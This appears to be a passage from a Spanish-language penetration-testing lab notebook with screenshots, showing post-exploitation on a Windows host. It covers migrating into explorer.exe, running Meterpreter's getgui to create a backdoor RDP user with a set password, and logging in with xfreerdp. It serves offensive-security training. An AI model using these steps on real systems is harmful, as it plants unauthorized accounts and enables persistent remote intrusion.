Una vez dentro, tenemos que ser el usuario administrador y mirarnos al proceso de explorer.exe:
![[Pasted image 20240615201138.png]]

![[Pasted image 20240615201143.png]]
Una vez migrado, tenemos que crear un usuario para el protocolo RDP y activarlo:
```bash
run getgui -e -u pinguino -p hack_123
```

![[Pasted image 20240615201150.png]]

Una vez hecho esto, ya podremos entrar dentro del protocolo RDP usando estas credenciales con la herramienta xfreerdp:
```bash
xfreerdp /u:pinguino /p:hack_123 /v:10.2.27.219
```

![[Pasted image 20240615201157.png]]